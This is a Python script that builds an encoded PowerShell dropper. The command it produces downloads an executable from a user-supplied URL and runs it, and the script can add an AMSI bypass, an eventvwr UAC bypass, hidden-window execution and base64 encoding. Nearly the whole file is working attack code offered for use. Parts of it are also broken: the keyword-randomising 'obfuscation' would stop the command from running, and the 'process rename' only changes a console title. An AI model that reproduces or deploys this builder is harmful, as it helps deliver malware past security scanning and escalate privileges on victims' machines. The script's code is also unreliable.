import os
import base64
import random
import string
import ctypes

# Function to generate random obfuscated strings.
def generate_random_string(min_length=8, max_length=12):
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# AMSI Bypass using memory patching (working code).
def amsi_bypass():
    return '''
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    '''

# UAC Bypass using eventvwr method.
def uac_bypass():
    return '''
    $registryPath = "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command";
    New-Item -Path $registryPath -Force | Out-Null;
    Set-ItemProperty -Path $registryPath -Name '(default)' -Value "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command {0}'\"";
    Start-Process eventvwr | Out-Null;
    Start-Sleep -Seconds 3;
    Remove-Item -Path $registryPath -Recurse -Force;
    '''

# Function to obfuscate PowerShell code by replacing keywords with random strings.
def obfuscate_code(command):
    obfuscation_map = {
        'New-Object': generate_random_string(),
        'System.Net.WebClient': generate_random_string(),
        'DownloadFile': generate_random_string(),
        'Start-Process': generate_random_string(),
        'Invoke-Expression': generate_random_string(),
        'IEX': generate_random_string(),
        'Write-Host': generate_random_string(),
        'Start-Sleep': generate_random_string(),
    }
    for key, value in obfuscation_map.items():
        command = command.replace(key, value)
    return command

# Function to encode PowerShell command to base64.
def encode_to_base64(command):
    return base64.b64encode(command.encode('UTF-16LE')).decode()

# Main function to create the PowerShell payload.
def create_powershell_payload():
    try:
        # Step 1: User inputs for payload URL
        payload_url = input("Enter the URL to download the payload: ").strip()

        # Validate the URL
        if not payload_url.startswith("http://") and not payload_url.startswith("https://"):
            raise ValueError("Invalid URL format. Please enter a valid URL starting with http:// or https://")

        # Step 2: Choose if AMSI and UAC bypass should be included
        use_amsi_bypass = input("Include AMSI Bypass? (y/n): ").strip().lower() == 'y'
        use_uac_bypass = input("Include UAC Bypass? (y/n): ").strip().lower() == 'y'

        # Step 3: Optional obfuscation and process renaming
        obfuscate = input("Obfuscate PowerShell command? (y/n): ").strip().lower() == 'y'
        rename_process = input("Rename PowerShell process? (y/n): ").strip().lower() == 'y'

        # Construct base PowerShell command for downloading payload.
        download_command = f"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('{payload_url}', $env:TEMP + '\\payload.exe'); Start-Process $env:TEMP\\payload.exe;"

        # Step 4: Add AMSI bypass if selected.
        if use_amsi_bypass:
            download_command = amsi_bypass() + download_command

        # Step 5: Add UAC bypass if selected.
        if use_uac_bypass:
            download_command = uac_bypass().format(download_command)

        # Step 6: Obfuscate the PowerShell command.
        if obfuscate:
            download_command = obfuscate_code(download_command)

        # Step 7: Base64 encode the final command.
        encoded_command = encode_to_base64(download_command)

        # Step 8: Optionally rename PowerShell process.
        if rename_process:
            new_process_name = generate_random_string()
            ctypes.windll.kernel32.SetConsoleTitleW(new_process_name)

        # Step 9: Print the encoded PowerShell command for execution.
        print(f"Encoded PowerShell Command: powershell -w hidden -Enc {encoded_command}")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

# Execute the script builder.
create_powershell_payload()
